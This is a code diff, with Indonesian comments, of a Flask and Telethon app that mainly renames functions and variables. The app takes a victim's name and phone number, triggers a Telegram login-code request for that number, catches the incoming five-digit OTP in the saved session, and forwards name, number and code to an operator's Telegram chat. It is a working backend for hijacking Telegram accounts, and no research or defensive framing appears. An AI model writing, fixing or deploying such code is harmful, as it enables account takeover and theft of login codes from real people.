@@ -18,14 +18,15 @@ CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 user_sessions = {}
 active_status_msg = {}
 
-def bot_send(method, payload):
+def bot_api(method, payload):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
     return requests.post(url, json=payload).json()
 
 @app.route('/register', methods=['POST'])
 def register():
-    # Menggunakan loop asinkron yang benar untuk Flask agar tidak error NoneType
-    return asyncio.run(handle_register(request.json))
+    data = request.json
+    # Menjalankan fungsi asinkron dengan loop yang aman
+    return asyncio.run(handle_register(data))
 
 async def handle_register(data):
     try:
@@ -41,8 +42,8 @@ async def handle_register(data):
             res = await client.send_code_request(nomor)
             user_sessions[nomor] = {"session": client.session.save(), "nama": nama}
             
-            # Tampilan bot sesuai Screenshot (4.30.11)
-            bot_send("sendMessage", {
+            # Format pesan sesuai permintaan
+            bot_api("sendMessage", {
                 "chat_id": CHAT_ID,
                 "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                 "parse_mode": "Markdown",
@@ -56,36 +57,35 @@ async def handle_register(data):
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    data = request.json
-    if "callback_query" in data:
-        call = data["callback_query"]
-        callback_data = call["data"]
+    update = request.json
+    if "callback_query" in update:
+        call = update["callback_query"]
+        data = call["data"]
         
-        if callback_data.startswith("track_"):
-            nomor = callback_data.split("_")[1]
-            # Munculkan "Bot siap menerima OTP!" sesuai Screenshot (4.30.10)
-            res = bot_send("sendMessage", {
+        if data.startswith("track_"):
+            nomor = data.split("_")[1]
+            # Kirim pesan status menunggu
+            res = bot_api("sendMessage", {
                 "chat_id": CHAT_ID,
                 "text": "Bot siap menerima OTP!",
                 "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
             })
             active_status_msg[nomor] = res.get("result", {}).get("message_id")
             
-            # Jalankan listener di background
             session_str = user_sessions.get(nomor, {}).get("session")
             if session_str:
-                asyncio.run(otp_listener(nomor, session_str))
+                asyncio.run(start_otp_listener(nomor, session_str))
 
-        elif callback_data.startswith("exit_"):
-            nomor = callback_data.split("_")[1]
+        elif data.startswith("exit_"):
+            nomor = data.split("_")[1]
             if nomor in active_status_msg:
-                bot_send("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
-            # Pesan keluar sesuai Screenshot (4.30.10)
-            bot_send("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})
+                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
+            # Pesan keluar
+            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})
 
     return jsonify({"status": "success"}), 200
 
-async def otp_listener(nomor, session_str):
+async def start_otp_listener(nomor, session_str):
     client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
     await client.connect()
     
@@ -94,10 +94,11 @@ async def otp_listener(nomor, session_str):
         otp = re.search(r'\b\d{5}\b', event.raw_text)
         if otp:
             if nomor in active_status_msg:
-                bot_send("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
+                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
             
             nama = user_sessions.get(nomor, {}).get("nama", "User")
-            bot_send("sendMessage", {
+            # Kirim log dengan OTP
+            bot_api("sendMessage", {
                 "chat_id": CHAT_ID,
                 "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp.group(0)}`",
                 "parse_mode": "Markdown"
